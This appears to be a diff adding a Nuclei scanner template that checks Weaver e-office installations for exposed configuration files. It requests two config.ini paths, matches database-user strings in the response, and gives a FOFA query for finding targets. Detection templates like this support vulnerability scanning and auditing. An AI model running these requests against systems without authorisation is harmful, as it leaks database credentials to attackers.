@@ -1,0 +1,27 @@
+id: FanWei-eoffice-config-Information-disclosure
+
+info:
+  name: 泛微eoffice两处config接口存在信息泄露
+  author: changge
+  severity: high
+  description: 泛微eoffice两处config接口存在信息泄露
+  metadata:
+    fofa-query: app="泛微-EOffice"
+
+http:
+  - raw:
+      - |
+        GET /building/config/config.ini HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: any
+    matchers:
+      - type: word
+        words:
+          - "user"
+          - "sdbuser"
+        part: body
